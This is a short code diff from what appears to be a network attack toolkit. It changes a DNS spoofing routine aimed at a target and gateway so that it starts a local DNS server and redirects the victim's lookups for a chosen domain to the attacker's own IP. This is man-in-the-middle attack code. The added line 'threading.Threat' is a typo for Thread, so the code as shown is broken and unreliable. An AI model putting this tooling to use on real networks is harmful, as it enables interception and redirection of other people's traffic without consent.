@@ -6,6 +6,8 @@ from ..modules import sniffer
 from ..manipulation import http_modifier
 from ..modules import dns_spoofer
 from ..utils import get_mac
+from ..utils import get_local_ip
+from ..modules import dns_server
 import subprocess
 
 
@@ -129,9 +131,18 @@ def start_dns_spoofer(target_ip, gateway_ip, interface, target_domain):
         )
         spoof_thread.start()
 
-        # Start the sniffer in the main thread to capture traffic
+        server_thread = threading.Threat(
+            target=dns_server.start_dns_server,
+            args=(),
+            daemon=True
+        )
+        server_thread.start()
+
+        # Start the spoofer in the main thread to capture traffic
         print("[CORE] Starting DNS spoofer. Press Ctrl+C to stop.")
-        dns_spoofer.start(target_domain, "10.0.0.1")
+
+        self_ip = get_local_ip()
+        dns_spoofer.start(target_domain, self_ip)
         
 
     except KeyboardInterrupt:
